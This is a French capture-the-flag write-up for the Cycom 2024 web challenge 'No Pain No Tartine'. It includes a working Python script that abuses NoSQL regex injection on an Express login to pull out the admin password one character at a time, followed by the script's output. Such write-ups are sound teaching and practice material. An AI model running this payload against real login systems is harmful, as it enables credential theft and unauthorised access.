---
title: "No Pain No Tartine"
date: 2024-04-14T09:03:20-08:00
draft: false
---

# Cycom 2024 - No Pain No Tartine - Web - 400 points

## Énoncé
Je veux des tartines, je veux du paing et je veux le mot de passe admin.
Le mot de passe de l'administrateur suit le format CYCOM{}.

## Solution
Le défi nous présente une page de connexion :

![](/images/2024/012/01.png)

Un placeholder suggère que le nom d'utilisateur pourrait être "admin". Il semble impossible d'exploiter des injections SQL ici. De plus, aucun mot de passe simple ne semble fonctionner.

![](/images/2024/012/02.png)

Cependant, en examinant la requête envoyée au serveur, on découvre qu'il s'agit d'une application Express, ce qui nous amène à envisager une potentielle injection NoSQL.

![](/images/2024/012/03.png)

Nous pouvons utiliser des expressions régulières pour effectuer des recherches dans la base de données. Il suffit alors de créer un script pour déterminer le mot de passe :

```py
import requests

url = 'http://localhost:50012/login'

username = 'admin'

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{ }_-*!;."

found_flag = ''
while not found_flag.endswith('}'):
    for char in chars:
        payload = {
            'username': username,
            'password': {'$regex': f'^{found_flag}{char}.*'}
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            found_flag += char
            print(f'\nFlag: {found_flag}')
            break

print(f'Flag found: {found_flag}')

```
On lance le script : 

```
python solve.py

Flag: C
Flag: CY
Flag: CYC
Flag: CYCO
Flag: CYCOM
Flag: CYCOM{
Flag: CYCOM{N
Flag: CYCOM{N0
Flag: CYCOM{N0_
Flag: CYCOM{N0_5
Flag: CYCOM{N0_5Q
Flag: CYCOM{N0_5Q1
Flag: CYCOM{N0_5Q1_
Flag: CYCOM{N0_5Q1_
...

Flag found: CYCOM{N0_5Q1_*******************}
```
*FLAG : CYCOM{N0_5Q1_\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*}*

## Auteur

Nasty